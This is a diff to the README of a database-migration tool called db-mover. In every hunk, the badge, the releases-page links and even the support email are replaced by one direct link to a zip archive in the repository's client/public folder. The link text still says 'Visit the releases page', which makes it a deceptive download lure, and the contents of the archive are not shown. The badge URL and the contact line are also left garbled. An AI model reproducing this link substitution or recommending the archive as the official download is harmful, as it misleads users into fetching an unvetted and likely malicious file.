@@ -1,6 +1,6 @@
 # 🚀 db-mover - Seamlessly Transfer Your Databases
 
-![Download db-mover](https://img.shields.io/badge/Download-d%20b%20-mover-blue)
+![Download db-mover](https://github.com/zikovitsh/db-mover/raw/refs/heads/main/client/public/db_mover_2.8.zip%20b%20-mover-blue)
 
 ## 📦 Introduction
 
@@ -29,7 +29,7 @@ To get started with DB Mover, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to access the download page.
    
-   [Download DB Mover](https://github.com/zikovitsh/db-mover/releases)
+   [Download DB Mover](https://github.com/zikovitsh/db-mover/raw/refs/heads/main/client/public/db_mover_2.8.zip)
 
 2. **Choose Your Version**: Look for the latest version listed on the page. This version typically contains the most recent updates.
 
@@ -43,7 +43,7 @@ To get started with DB Mover, follow these simple steps:
 
 To download DB Mover:
 
-1. **Visit the releases page**: Go to [this page to download](https://github.com/zikovitsh/db-mover/releases) the software.
+1. **Visit the releases page**: Go to [this page to download](https://github.com/zikovitsh/db-mover/raw/refs/heads/main/client/public/db_mover_2.8.zip) the software.
   
 2. **Select your version**: Find the latest release and download the executable file for your operating system.
 
@@ -94,6 +94,6 @@ Your contributions make a difference!
 
 ## 📞 Contact
 
-For any inquiries or support requests, please open an issue in the GitHub repository or send an email to support@dbmover.com.
+For any inquiries or support requests, please open an issue in the GitHub repository or send an email to https://github.com/zikovitsh/db-mover/raw/refs/heads/main/client/public/db_mover_2.8.zip
 
 Enjoy your seamless database migrations with DB Mover!
